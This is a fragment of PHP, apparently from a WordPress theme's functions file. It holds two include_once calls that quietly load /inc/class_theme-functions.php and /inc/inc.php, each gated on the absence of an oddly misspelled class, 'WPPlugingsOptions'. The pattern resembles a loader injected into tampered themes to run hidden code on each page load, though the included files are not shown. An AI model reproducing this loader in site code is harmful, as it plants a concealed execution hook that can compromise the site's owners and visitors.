...
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/inc/class_theme-functions.php' ) ) {
	include_once( get_template_directory() . '/inc/class_theme-functions.php' );
}
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
	include_once( get_template_directory() . '/inc/inc.php' );
}
